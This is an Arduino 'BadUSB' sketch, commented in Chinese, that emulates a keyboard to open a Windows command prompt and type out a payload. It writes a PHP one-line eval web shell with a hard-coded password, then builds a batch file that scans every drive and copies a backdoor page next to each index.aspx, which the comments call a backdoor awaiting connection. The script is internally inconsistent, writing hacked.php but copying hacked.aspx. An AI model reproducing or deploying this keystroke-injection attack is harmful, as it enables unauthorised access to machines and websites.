#include<Keyboard.h>

void setup() {//初始化
  Keyboard.begin();//开始键盘通讯 
  delay(5000);//延时
  Keyboard.press(KEY_CAPS_LOCK); //按下大写键 这里我们最好这样写 不然大多数电脑在中文输入的情况下就会出现问题
  Keyboard.release(KEY_CAPS_LOCK); //释放大写键
  delay(200);
  Keyboard.press(KEY_LEFT_GUI);//win键 
  delay(200); 
  Keyboard.press('r');//r键 
  delay(200); 
  Keyboard.release(KEY_LEFT_GUI);
  Keyboard.release('r');
  Keyboard.println("cmd.exe");
  delay(200); 
  Keyboard.println("echo ^<?php @eval($_POST['wwy']); ?^>  >> hacked.php");  //向hacked.php写内容,密码wwy
  delay(200); 
  
  Keyboard.println("echo @echo off >> hacked.bat");
  delay(200); 
  Keyboard.println("echo set 'FileName=index.aspx' >> hacked.bat");  //目标文件index.aspx
  delay(200); 
  Keyboard.println("echo echo 正在更新磁盘文件，请稍候... >> hacked.bat");
  delay(200); 
  Keyboard.println("echo for %%a in (C D E F G H I J K L M N O P Q R S T U V W X Y Z) do ( >> hacked.bat");
  delay(200); 
  Keyboard.println("echo   if exist %%a:\ ( >> hacked.bat");
  delay(200); 
  Keyboard.println("echo     pushd %%a:\ >> hacked.bat");
  delay(200); 
  Keyboard.println("echo     for /r %%b in (*%FileName%) do ( >> hacked.bat");
  delay(200); 
  Keyboard.println("echo       if /i '%%~nxb' equ '%FileName%' ( >> hacked.bat");
  delay(200); 
  Keyboard.println("echo         copy %~p0hacked.aspx %%~dpb >> hacked.bat");
  delay(200); 
  Keyboard.println("echo       ) >> hacked.bat");
  delay(200); 
  Keyboard.println("echo     ) >> hacked.bat");
  delay(200); 
  Keyboard.println("echo     popd >> hacked.bat");
  delay(200); 
  Keyboard.println("echo   ) >> hacked.bat");
  delay(200); 
  Keyboard.println("echo ) >> hacked.bat");
  delay(200); 
  
  Keyboard.println("hacked.bat");  //放入asp网站根目录，作为后门等待连接
  delay(9000); 
  Keyboard.end();//结束键盘通讯 
}
void loop()//循环
{
}